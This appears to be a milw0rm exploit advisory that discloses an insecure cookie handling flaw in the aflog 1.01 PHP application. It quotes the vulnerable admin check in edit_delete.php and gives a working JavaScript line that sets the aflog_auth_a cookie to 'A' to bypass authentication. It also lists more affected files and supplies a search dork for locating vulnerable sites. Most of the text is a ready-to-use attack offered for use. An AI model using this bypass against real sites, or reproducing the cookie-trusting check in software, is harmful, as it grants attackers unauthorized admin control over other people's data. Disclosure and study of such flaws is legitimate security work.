@@ -1,0 +1,36 @@
+# aflog 1.01 Multiple Insecure Cookie Handling Vulnerabilies
+# url: http://www.aflog.org/download.php
+#
+# Author: JosS
+# mail: sys-project[at]hotmail[dot]com
+# site: http://spanish-hackers.com
+# team: Spanish Hackers Team - [SHT]
+#
+# This was written for educational purpose. Use it at your own risk.
+# Author will be not responsible for any damage.
+
+vuln file: /edit_delete.php
+vuln code:
+15: if($_COOKIE['aflog_auth_a']=="O" || $_COOKIE['aflog_auth_a']=="A"){
+xx: .. ---> :P
+33: }
+34: } else {
+35:  echo "<center><b><img src='img/x.png'>&nbsp;ERROR!</b><br>You do not have access to this page. You must be Signed In as
+36: an Admin.</center><br>";
+37:  echo "<center><a href='index.php' class='c'>Home</a> | <a href='login.php?do=form' class='c'>Sign In</a></center>":
+38: }
+
+exploit:    javascript:document.cookie = "aflog_auth_a=0; path=/"; document.cookie = "aflog_auth_a=A; path=/";
+and enters: /edit_delete.php?id=1 --> POST ID!!
+---
+vuln files:
+edit_cat.php
+edit_lock.php
+edit_form.php
+...more?
+
+dork: "powered by aflog"
+
+Hack0wn :D
+
+# milw0rm.com [2008-10-23]
